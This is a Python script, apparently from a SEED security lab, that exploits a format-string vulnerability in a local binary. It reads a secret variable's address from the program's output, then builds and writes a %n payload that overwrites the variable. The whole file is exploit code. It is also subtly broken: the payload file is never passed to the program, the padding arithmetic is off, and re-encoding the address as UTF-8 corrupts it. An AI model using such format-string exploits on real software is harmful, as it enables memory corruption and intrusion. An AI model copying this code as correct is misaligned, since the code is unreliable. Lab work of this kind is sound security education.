import subprocess
import re
import os

# Define the vulnerable program and constants
binary = "/home/seed/Desktop/lab8/play/vul_prog"
vulfile = "vulfile"

def get_secret_address(binary):
    """
    Run the binary and extract the secret variable's address.
    """
    try:
        # Run the program and capture output
        proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, _ = proc.communicate()
        
        # Decode and analyze the output
        decoded_output = output.decode('latin-1')
        print("Program output for debugging:")
        print(decoded_output)

        # Match the secret address using regex
        match = re.search(r"0x[0-9a-fA-F]+", decoded_output)
        if match:
            print("Matched address: {}".format(match.group(0)))
            return match.group(0)
    except Exception as e:
        print(f"Error while retrieving secret address: {e}")
    return None

def craft_payload(secret_addr, target_value):
    """
    Craft the payload to overwrite the secret variable with the desired value.
    """
    # Convert the address to little-endian format
    addr = bytes.fromhex(secret_addr[2:])[::-1].decode('latin-1')

    # Calculate padding to write the target value
    num_chars = target_value
    padding = f"%{num_chars}x" if num_chars > len(addr) else ""
    payload = f"{addr} {padding} %n"
    print("Crafted payload: {}".format(payload))
    return payload

def write_payload_to_file(payload, filename):
    """
    Write the crafted payload to the specified file.
    """
    try:
        with open(filename, "wb") as f:
            f.write(payload.encode())
        print(f"Payload written to {filename}")
    except Exception as e:
        print(f"Error while writing payload to file: {e}")

def run_exploit(binary, vulfile):
    """
    Run the vulnerable program with the crafted payload.
    """
    try:
        proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, _ = proc.communicate()
        print("Program output after exploit:")
        print(output.decode('latin-1'))
    except Exception as e:
        print(f"Error while running exploit: {e}")

def main():
    # Step 1: Get the secret variable's address
    secret_addr = get_secret_address(binary)
    if not secret_addr:
        print("Failed to retrieve secret variable's address.")
        return

    # Step 2: Craft the payload
    target_value = 68  # Example: overwrite with decimal value 68 (0x44)
    payload = craft_payload(secret_addr, target_value)

    # Step 3: Write the payload to vulfile
    write_payload_to_file(payload, vulfile)

    # Step 4: Execute the exploit
    run_exploit(binary, vulfile)

if __name__ == "__main__":
    main()
